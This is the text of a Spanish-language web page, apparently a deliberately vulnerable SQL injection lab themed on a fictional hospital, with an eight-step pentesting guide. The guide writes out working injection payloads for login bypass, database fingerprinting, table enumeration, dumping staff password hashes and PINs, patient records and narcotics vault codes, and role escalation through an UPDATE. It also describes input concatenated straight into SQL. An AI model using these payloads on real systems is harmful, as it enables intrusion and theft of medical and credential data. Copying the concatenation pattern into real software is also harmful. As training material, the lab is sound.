                Modo de Ejecución del Backend:
                

                    
                    
                

                

                    Las entradas del usuario se concatenan directamente en la consulta SQL.
                

            


            
            

                

                    Consulta SQL Compilada en Servidor:
                    
                

                

                    
SELECT * FROM articulos_salud_publicos...

                

            


            
            

                

                    Tablas Ocultas SQLite:
                    
                

                

                    
                

            


            
            

                🎓 Guía de Pentesting SQLi Paso a Paso:
                


                    
                    

                        Paso 1: Detección y Confirmación
                        
Confirma si el campo es vulnerable probando errores o lógica verdadera.

                        

                            Provocar Error de Sintaxis:
                            '
                            
                        

                        

                            Lógica Verdadera (1=1):
                            ' OR '1'='1
                            
                        

                    


                    
                    

                        Paso 2: Contar Columnas Requeridas
                        
La consulta original solicita 6 columnas. UNION SELECT requiere 6 valores.

                        

                            ' UNION SELECT 1, 2, 3, 4, 5, 6 -- 
                            
                        

                    


                    
                    

                        Paso 3: Identificar Motor de BD (Fingerprinting)
                        
Como auditor no sabes qué motor hay detrás. Prueba las funciones de versión de cada SGBD por descarte hasta que una responda con éxito:

                        
                        

                            A) Probando MySQL (VERSION()):
                            ' UNION SELECT 1, VERSION(), 'MySQL Test', 4, 5, 6 -- 
                            
                        

                        
                        

                            B) Probando PostgreSQL (version()):
                            ' UNION SELECT 1, version(), 'Postgres Test', 4, 5, 6 -- 
                            
                        


                        

                            C) Probando SQL Server (@@VERSION):
                            ' UNION SELECT 1, @@VERSION, 'MSSQL Test', 4, 5, 6 -- 
                            
                        


                        

                            D) Probando SQLite (sqlite_version()):
                            ' UNION SELECT 1, sqlite_version(), 'Motor SQLite Confirmado', 4, 5, 6 -- 
                            
                        

                    


                    
                    

                        Paso 4: Enumerar Tablas (`sqlite_master`)
                        
Descubrir las tablas ocultas del sanatorio en el esquema principal.

                        

                            ' UNION SELECT 1, type, name, tbl_name, sql, 6 FROM sqlite_master -- 
                            
                        

                    


                    
                    

                        Paso 5: Extraer Cuentas y Hashes
                        
Volcar emails, nombres, hashes bcrypt, PINs y roles de doctores y admins.

                        

                            ' UNION SELECT 1, email, nombre || ' ' || apellido, password_hash, pin_acceso_quirofano, rol FROM personal_medico_usuarios -- 
                            
                        

                    


                    
                    

                        Paso 6: Extraer Historias Clínicas y Farmacia
                        
Volcar expedientes confidenciales de pacientes o PINs de narcóticos.

                        

                            Pacientes:
                            ' UNION SELECT 1, numero_expediente, nombre_paciente, dni_ssn, diagnostico_principal, tratamiento_prescripto FROM historias_clinicas_pacientes -- 
                            
                        

                        

                            Bóveda Narcóticos:
                            ' UNION SELECT 1, codigo_sustancia, nombre_medicamento, boveda_ubicacion, pin_boveda_narcoticos, nivel_acceso_requerido FROM equipamiento_y_farmacia -- 
                            
                        

                    


                    
                    

                        Paso 7: Auth Bypass en Login
                        
Bypass de autenticación para ingresar como SysAdmin sin contraseña.

                        

                            sysadmin@santamariahealth.org' -- 
                            
                        

                    


                    
                    

                        Paso 8: Escalado de Privilegios (UPDATE)
                        
Elevar el usuario a `root_sysadmin` inyectando la especialidad médica.

                        

                            Cardiología', rol = 'root_sysadmin
